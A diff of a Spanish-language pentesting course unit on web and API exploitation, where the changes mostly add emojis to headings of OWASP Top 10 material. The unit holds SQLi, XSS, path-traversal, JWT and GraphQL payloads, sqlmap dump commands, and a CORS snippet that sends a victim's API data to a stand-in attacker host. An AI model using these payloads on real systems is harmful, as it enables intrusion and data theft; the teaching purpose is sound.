@@ -1,44 +1,44 @@
-# Unidad 3: Explotación Web y APIs 2026
+# Unidad 3: Explotación Web y APIs 2026 🕷️
 
-## Objetivos de Aprendizaje
+## 🎯 Objetivos de Aprendizaje
 
-- **Identificar** y explotar vulnerabilidades web modernas según OWASP Top 10.
-- **Auditar** APIs REST y GraphQL identificando vulnerabilidades específicas.
-- **Ejecutar** ataques avanzados como XSS, SQLi y bypasses de seguridad.
-- **Aplicar** técnicas de pentesting web con herramientas profesionales.
+- **Identificar** 🔍 y explotar vulnerabilidades web modernas según OWASP Top 10.
+- **Auditar** 🛠️ APIs REST y GraphQL identificando vulnerabilidades específicas.
+- **Ejecutar** ⚔️ ataques avanzados como XSS, SQLi y bypasses de seguridad.
+- **Aplicar** 🛡️ técnicas de pentesting web con herramientas profesionales.
 
 ---
 
-## Contenido Teórico
+## 📚 Contenido Teórico
 
-### 3.1 OWASP Top 10 2025
+### 3.1 OWASP Top 10 2025 🔐
 
 El OWASP Top 10 es la referencia fundamental para seguridad web. La versión 2025 incluye:
 
 | # | Categoría | Descripción | Severidad |
 |---|----------|-------------|-----------|
-| A01 | Broken Access Control | Deficiencias en controls de autorización | Crítica |
-| A02 | Cryptographic Failures | Fallos en cifrado de datos sensibles | Alta |
-| A03 | Injection | Inyección SQL, NoSQL, OS command | Crítica |
-| A04 | Insecure Design | Falta de diseño seguro | Alta |
-| A05 | Security Misconfiguration | Configuraciones inseguras | Media |
-| A06 | Vulnerable Components | Componentes con vulnerabilidades | Alta |
-| A07 | Auth Failures | Fallos en autenticación/gestión de sesiones | Alta |
-| A08 | Data Integrity Failures | Fallos en integridad de software/datos | Media |
-| A09 | Security Logging Failures | Logs insuficientes para detección | Media |
-| A10 | SSRF | Server-Side Request Forgery | Alta |
+| A01 | Broken Access Control | Deficiencias en controls de autorización | Crítica 🔴 |
+| A02 | Cryptographic Failures | Fallos en cifrado de datos sensibles | Alta 🟠 |
+| A03 | Injection 💉 | Inyección SQL, NoSQL, OS command | Crítica 🔴 |
+| A04 | Insecure Design | Falta de diseño seguro | Alta 🟠 |
+| A05 | Security Misconfiguration 🛠️ | Configuraciones inseguras | Media 🟡 |
+| A06 | Vulnerable Components | Componentes con vulnerabilidades | Alta 🟠 |
+| A07 | Auth Failures 🔐 | Fallos en autenticación/gestión de sesiones | Alta 🟠 |
+| A08 | Data Integrity Failures | Fallos en integridad de software/datos | Media 🟡 |
+| A09 | Security Logging Failures | Logs insuficientes para detección | Media 🟡 |
+| A10 | SSRF 🕷️ | Server-Side Request Forgery | Alta 🟠 |
 
-#### A01: Broken Access Control
+#### A01: Broken Access Control 🛡️
 
 **Concepto**: El usuario puede actuar fuera de su intención autorizada.
 
-**Ejemplos de ataque**:
+**Ejemplos de ataque** ⚔️:
 - Elevación de privilegios horizontal/vertical
-- IDOR (Insecure Direct Object Reference)
+- IDOR (Insecure Direct Object Reference) 🐛
 - Bypass de restricciones URL
 - Acceso a API sin verificación
 
-**Payloads de prueba**:
+**Payloads de prueba** 🛠️:
 ```
 # IDOR
 GET /api/user/1234  → GET /api/user/1235
@@ -50,17 +50,17 @@ GET /admin/deleteUser → POST /admin/deleteUser?_method=DELETE
 GET /files/../../etc/passwd
 ```
 
-#### A02: Cryptographic Failures
+#### A02: Cryptographic Failures 🔐
 
 **Concepto**: Fallos en la protección de datos sensibles.
 
-**Vulnerabilidades comunes**:
+**Vulnerabilidades comunes** 🐛:
 - Algoritmos débiles (MD5, SHA1)
 - Claves por defecto
 - Ausencia de cifrado
 - Certificados inválidos
 
-**Detección**:
+**Detección** 🔍:
 ```bash
 # SSL scan
 sslscan target.com
@@ -69,14 +69,14 @@ sslscan target.com
 curl -kv https://target.com
 ```
 
-#### A03: Injection
+#### A03: Injection 💉
 
 **Concepto**: Envío de datos no confiables a un interprete.
 
 **Tipos**:
-- SQL Injection
+- SQL Injection 🗄️
 - NoSQL Injection
-- OS Command Injection
+- OS Command Injection 💻
 - LDAP Injection
 - XPath Injection
 
@@ -87,29 +87,29 @@ curl -kv https://target.com
 ' AND 1=1--
 ```
 
-**SQLi bypass WAF**:
+**SQLi bypass WAF** 🚀:
 ```
 /*!50000UNION*/ SELECT
 /**/UNION/**/SELECT
 %0aUNION%0aSELECT
 ```
 
-#### A04: Insecure Design
+#### A04: Insecure Design 📐
 
-**Falta de modelo de amenazas**, no solo código inseguro:
+**Falta de modelo de amenazas** 🐛, no solo código inseguro:
 - Ausencia de revisión de diseño
 - APIs sin rate limiting
 - Procesos de negocio inseguros
 - Falta de segregación de datos
 
-#### A05: Security Misconfiguration
+#### A05: Security Misconfiguration 🛠️
 
 - Headers de seguridad faltantes
 - Debug enabled en producción
 - Paneles admin accesibles
 - Credenciales por defecto
 
-**Verificación**:
+**Verificación** 🔍:
 ```bash
 # Headers de seguridad
 curl -I https://target.com
@@ -120,18 +120,18 @@ curl -v https://target.com
 
 ---
 
-### 3.2 APIs Security
+### 3.2 APIs Security 🔐
 
-#### REST API Vulnerabilities
+#### REST API Vulnerabilities 🕷️
 
 | Vulnerabilidad | Descripción | Impacto |
 |---------------|-------------|---------|
-| BOLA | Broken Object Level Authorization | Acceso a datos de otros |
-| BFLA | Broken Function Level Authorization | Ejecución de funciones no autorizadas |
+| BOLA | Broken Object Level Authorization | Acceso a datos de otros ⚠️ |
+| BFLA | Broken Function Level Authorization | Ejecución de funciones no autorizadas ⚠️ |
 | BEE | Bulk Assignment | Exposición masiva de campos |
 | Mass Assignment | Asignación masiva | Modificación de datos protegidos |
 
-**Testing**:
+**Testing** 🛠️:
 ```bash
 # Enumerar métodos
 curl -X OPTIONS https://api.target.com -v
@@ -141,9 +141,9 @@ curl -X GET https://api.target.com/users/1
 curl -X GET https://api.target.com/users/2
 ```
 
-#### GraphQL Injection
+#### GraphQL Injection 💉
 
-**Introspection enabled**:
+**Introspection enabled** 🔍:
 ```graphql
 query {
   __schema {
@@ -157,7 +157,7 @@ query {
 }
 ```
 
-**Injection**:
+**Injection** ⚔️:
 ```graphql
 query {
   user(id: "1' OR '1'='1") {
@@ -166,7 +166,7 @@ query {
 }
 ```
 
-**Bypass de depth limiting**:
+**Bypass de depth limiting** 🚀:
 ```graphql
 query {
   users1 { name }
@@ -175,14 +175,14 @@ query {
 }
 ```
 
-#### API Authentication Bypass
+#### API Authentication Bypass 🔐
 
-- JWTNone algorithm
+- JWTNone algorithm 🐛
 - Weak JWT signing keys
 - Token expiration not verified
 - OAuth misconfigurations
 
-**JWT attack**:
+**JWT attack** 💰:
 ```python
 # Cambiar alg a "none"
 {"alg": "none", "typ": "JWT"}
@@ -190,9 +190,9 @@ query {
 
 ---
 
-### 3.3 Web Attacks
+### 3.3 Web Attacks 🕷️
 
-#### XSS Avanzado
+#### XSS Avanzado 🚀
 
 **Tipos**:
 - Reflected XSS
@@ -201,7 +201,7 @@ query {
 - Self-XSS
 - Mutation XSS
 
-**Payloads**:
+**Payloads** ⚔️:
 ```javascript
 <script>alert(document.cookie)</script>
 <svg onload=alert(1)>
@@ -210,13 +210,13 @@ query {
 <iframe src="javascript:alert(document.cookie)">
 ```
 
-**DOM-based**:
+**DOM-based** 🐛:
 ```javascript
 // URL: example.com/search?q=<img src=x onerror=alert(1)>
 document.write(location.search);
 ```
 
-#### SQL Injection — Técnicas Avanzadas
+#### SQL Injection 💉 — Técnicas Avanzadas 🚀
 
 **SQLi clásico y variantes de bypass**:
 ```
@@ -227,7 +227,7 @@ document.write(location.search);
 /**/UNION/**/SELECT/**/
 ```
 
-**Blind SQLi basado en tiempo (Time-Based)**:
+**Blind SQLi basado en tiempo (Time-Based)** ⏱️:
 
 Cuando la aplicación no devuelve datos ni errores visibles, se puede inferir información midiendo el tiempo de respuesta del servidor.
 
@@ -245,7 +245,7 @@ Cuando la aplicación no devuelve datos ni errores visibles, se puede inferir in
 ' AND 1=(SELECT 1 FROM DUAL WHERE ROWNUM=1 AND (SELECT UPPER(banner) FROM v$version WHERE ROWNUM=1) LIKE 'ORACLE%')--
 ```
 
-**Blind SQLi basado en errores (Error-Based)**:
+**Blind SQLi basado en errores (Error-Based)** 💥:
 
 ```sql
 -- MySQL: extrae la versión provocando un error XPATH
@@ -258,7 +258,7 @@ Cuando la aplicación no devuelve datos ni errores visibles, se puede inferir in
 ' AND 1=CTXSYS.DRITHSX.SN(user,1)--
 ```
 
-**Extracción de datos con UNION SELECT**:
+**Extracción de datos con UNION SELECT** 📊:
 
 ```sql
 -- 1. Detectar número de columnas
@@ -276,7 +276,7 @@ Cuando la aplicación no devuelve datos ni errores visibles, se puede inferir in
 ' UNION SELECT username, password FROM users--
 ```
 
-**Automatización con SQLmap**:
+**Automatización con SQLmap** 🛠️:
 ```bash
 # Detección básica
 sqlmap -u "http://target.com/item?id=1"
@@ -293,22 +293,22 @@ sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump
 sqlmap -u "http://target.com/item?id=1" --tamper=space2comment,charencode
 ```
 
-#### CSRF y CORS
+#### CSRF y CORS 🛡️
 
-**CSRF Token bypass**:
+**CSRF Token bypass** 🐛:
 - Token en GET (visible en URL)
 - Token no ligado a sesión
 - Predictable token
 
-**CORS Misconfiguration**:
+**CORS Misconfiguration** ⚠️:
 ```
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
 ```
 
-#### Seguridad de APIs — Configuraciones Erróneas Comunes
+#### Seguridad de APIs 🛡️ — Configuraciones Erróneas Comunes 🐛
 
-**CORS mal configurado — explotación**:
+**CORS mal configurado — explotación** ⚔️:
 
 Si el servidor acepta cualquier origen con credenciales, un atacante puede leer respuestas de API autenticadas:
 
@@ -319,69 +319,69 @@ fetch('https://victima.com/api/me', {credentials: 'include'})
   .then(d => fetch('https://atacante.com/exfil?d=' + JSON.stringify(d)));
 ```
 
-**Detección de CORS**:
+**Detección de CORS** 🔍:
 ```bash
 curl -H "Origin: https://evil.com" -I https://api.target.com/endpoint
 # Buscar: Access-Control-Allow-Origin: https://evil.com
 # Buscar: Access-Control-Allow-Credentials: true
 ```
 
-**Security Headers ausentes** — verificación rápida:
+**Security Headers ausentes** 🔐 — verificación rápida 🔍:
 ```bash
 curl -I https://target.com | grep -iE "x-frame-options|content-security-policy|x-content-type|strict-transport"
 ```
 
-Headers críticos:
-- `Content-Security-Policy`: previene XSS
+Headers críticos 🛡️:
+- `Content-Security-Policy` 🛡️: previene XSS
 - `X-Frame-Options: DENY`: previene clickjacking
 - `X-Content-Type-Options: nosniff`: previene MIME sniffing
-- `Strict-Transport-Security`: fuerza HTTPS
+- `Strict-Transport-Security` 🔐: fuerza HTTPS
 
 ---
 
-## Herramientas
+## 🛠️ Herramientas
 
 | Herramienta | Propósito | Instalación |
 |-------------|-----------|-------------|
-| **Burp Suite Community** | Proxy web | java -jar burpsuite_community.jar |
-| **OWASP ZAP** | Scanner automatizado | zaproxy.org |
-| **SQLmap** | SQL Injection automation | `sqlmap -u target` |
-| **ffuf** | Fuzzing web | `ffuf -u target/FUZZ` |
-| **Postman** | Testing de APIs | postman.com |
-| **Nikto** | Scanner de vulnerabilidades | `nikto -h target` |
-| **Amass** | Enumeración de subdominios | `amass enum -d target` |
+| **Burp Suite Community** 🕷️ | Proxy web | java -jar burpsuite_community.jar |
+| **OWASP ZAP** 🔍 | Scanner automatizado | zaproxy.org |
+| **SQLmap** 💉 | SQL Injection automation | `sqlmap -u target` |
+| **ffuf** 🎯 | Fuzzing web | `ffuf -u target/FUZZ` |
+| **Postman** 🧪 | Testing de APIs | postman.com |
+| **Nikto** 🔍 | Scanner de vulnerabilidades | `nikto -h target` |
+| **Amass** 🔍 | Enumeración de subdominios | `amass enum -d target` |
 
 ---
 
-## Laboratorio
+## 🔬 Laboratorio
 
 > Ver [`labs/lab-unidad3.md`](../labs/lab-unidad3.md) para el escenario completo.
 
-**Escenario**: Auditear OWASP WebGoat o aplicación vulnerable en Docker. Cubrir:
-- SQLi en formularios de login
-- XSS reflected y stored
-- IDOR en cambia de perfil
-- GraphQL introspection y injection
+**Escenario** 🎯: Auditear OWASP WebGoat o aplicación vulnerable en Docker. Cubrir:
+- SQLi 💉 en formularios de login
+- XSS 🕷️ reflected y stored
+- IDOR 🐛 en cambia de perfil
+- GraphQL 💉 introspection y injection
 
-**Entregable**: Reporte técnico con hallazgos, PoC y recomendaciones.
-
----
-
-## Recursos Adicionales
-
-- [OWASP Web Security Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/) — guía exhaustiva de pruebas de seguridad web
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — laboratorios gratuitos de Burp Suite para SQLi, XSS, CSRF, CORS y más
-- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) — estándar de referencia para vulnerabilidades en APIs REST y GraphQL
-- [SQLmap Documentation](https://sqlmap.org/) — referencia oficial de la herramienta de automatización de inyección SQL
-- [TryHackMe: OWASP Top 10](https://tryhackme.com/room/owasptop10) — sala práctica gratuita con ejercicios por cada categoría OWASP
-- [HackTheBox: Web Challenges](https://app.hackthebox.com/challenges) — retos de aplicaciones web de dificultad progresiva
+**Entregable** 📄: Reporte técnico con hallazgos, PoC y recomendaciones.
 
 ---
 
-## Bibliografía
+## 📚 Recursos Adicionales
 
-- [OWASP Top 10 2025](https://owasp.org/www-project-top-ten/)
-- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
-- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [OWASP Web Security Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/) 📖 — guía exhaustiva de pruebas de seguridad web
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) 🎓 — laboratorios gratuitos de Burp Suite para SQLi, XSS, CSRF, CORS y más
+- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) 🔐 — estándar de referencia para vulnerabilidades en APIs REST y GraphQL
+- [SQLmap Documentation](https://sqlmap.org/) 📖 — referencia oficial de la herramienta de automatización de inyección SQL
+- [TryHackMe: OWASP Top 10](https://tryhackme.com/room/owasptop10) 🔬 — sala práctica gratuita con ejercicios por cada categoría OWASP
+- [HackTheBox: Web Challenges](https://app.hackthebox.com/challenges) ⚔️ — retos de aplicaciones web de dificultad progresiva
+
+---
+
+## 📚 Bibliografía
+
+- [OWASP Top 10 2025](https://owasp.org/www-project-top-ten/) 🔐
+- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) 📚
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) 🎓
+- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) 🔐
+- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) 🛡️
